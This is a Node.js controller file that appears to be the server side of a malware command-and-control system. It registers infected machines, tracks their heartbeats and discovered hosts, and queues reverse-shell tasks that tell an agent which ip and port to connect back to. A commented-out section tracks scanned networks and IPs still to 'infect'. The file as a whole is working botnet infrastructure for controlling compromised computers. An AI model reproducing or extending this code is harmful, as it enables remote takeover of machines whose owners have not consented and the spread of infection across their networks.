const config = require("../config/auth.config");
const db = require("../models");
const User = db.user;
const Role = db.role;
const GlobInf = db.globinf;
const Machine = db.machine;
const Nums = db.nums;
var sanitize = require('mongo-sanitize')

var jwt = require("jsonwebtoken");
var bcrypt = require("bcryptjs");

const statusAgent = async (req, res) => {
    const action = sanitize(req.body.action);

    const global_infos = await GlobInf.find({}, (err, globinf) => {
        if (err) {
            res.status(500).send({err});
            return ;
        }
        return (globinf);
    });

//   switch (action.status) {
//     case "networkscan":
//         const network = req.body.data.ip.split('.');
//         network.splice(3);
//         res.status(200).send({toscan: !global_infos.scanned_networks.includes(network + ".0/24")}); // Ajouter après check si n'existe pas
//         break;
//     case "infected":
//         const ip = req.body.data.ip;
//         res.status(200).send({toinfect: !global_infos.infected.includes(ip)}); // Ajouter après check si n'existe pas
//         break;
//     default:
//         break;
//   }
//   return ;
};

const updateAgent = async (req, res) => {
    console.log(req.body);
    const hostname = sanitize(req.body.host);
    const db_value = sanitize(req.body.value);

    console.log(hostname, db_value);
    Machine.updateOne({computer_name: hostname}, {[db_value]: true}).exec((err) => {
        if (err) {
            console.log(err);
            res.status(500).send({message: err});
            return ;
        }
    }, (response) => {
        console.log("REPONSE UPDATE MODIF");
        console.log(response);
    })
    return ;
};


const discoveredHosts = async (req, res) => {
    const hostDiscovered = sanitize(req.body.hostDiscoverd);

    GlobInf.updateOne({}, {discoveredHosts: hostDiscovered}, (err) => {
        if (err) {
            res.status(500).send({message: err});
            return ;
        }
    })
    return ;
};

const announce = async (req, res) => {
    const info = new Machine({...sanitize(req.body), initial_date: Date.now(), alive: true});
    console.log(info, req.body);

    Machine.findOne({computer_name: info.computer_name}, async (err, machine) => {
        if (err) {
            res.status(500).send({err});
            return ;
        }
        if (machine === null) {
            info.save(err => {
                if (err) {
                    console.log(err)
                    res.status(500).send({err});
                    return ;
                }
            })
            const num = await Nums.findOne({},{}, { sort: { "atTime": -1 } });
            if (num && num.alive !== NaN) await new Nums({alive: num.alive + 1}).save();
            else await new Nums({alive: 1}).save();
            res.status(200).send({message: "machine successfully added to db"})
            return ;
        }
    })
    // res.status(200).send({message: "machine not saved because ip already existing in db"});
    return ;
};

const alive = async (req, res) => {
    const machine = sanitize(req.body);
    console.log(machine.computer_name);

    Machine.updateOne({computer_name: machine.computer_name}, {alive: true, lastAlive: Date.now()}, async (err) => {
        if (err) {
            res.status(500).send({message: err});
            return ;
        }
        // const num = await Nums.findOne({},{}, { sort: { "atTime": -1 } });
        // if (num && num.alive !== NaN) await new Nums({alive: num.alive + 1}).save();
        // else await new Nums({alive: 1}).save();
        res.status(200).send({message: "updated"});
    })
    return ;
};

const revshell = async (req, res) => { // update db to set needed to true or false
    const computer_name = sanitize(req.body.computer_name);
    let revshelll = sanitize(req.body.machines);

    
    revshelll = revshelll.find(mach => mach.computer_name === computer_name).revshell;
    console.log(revshelll);

    Machine.updateOne({computer_name: computer_name}, {revshell: {need: revshelll.need, port: revshelll.port, ip: revshelll.ip, nb: revshelll.nb + 1 }}).exec((err) => {
        if (err) {
            res.status(500).send(err);
            return ;
        }
        Machine.find().exec((err, response) => {
            if (err) {
                console.log(err);
                res.status(500).send({err});
                return ;
            }
            console.log(response);
            res.status(200).send(response);
        })
    })
    return ;
}

const getRevshell = async (req, res) => { // Tell the agent if the revshell is needed or not
    const computer_name = sanitize(req.body.computer_name);

    Machine.findOne({computer_name}).exec(
        (err, machine) => {
            if (err) {
                res.status(500).send(err);
                return ;
            }
            console.log(machine);
            if (machine && machine.revshell && machine.revshell.need) {
                Machine.updateOne({computer_name: machine.computer_name}, {revshell: {need: false, port: -1, ip: "", nb: machine.revshell.nb + 1}}).exec((err) => {
                    if (err) {
                        console.log(err);
                    }
                })
                res.status(200).send({ need: true, port: String(machine.revshell.port), ip: machine.revshell.ip });
                return ;
            }
            res.status(200).send({need: false});
        }
    )
    return ;
}

module.exports = {
    statusAgent,
    announce,
    alive,
    revshell,
    getRevshell,
    updateAgent,
    discoveredHosts
}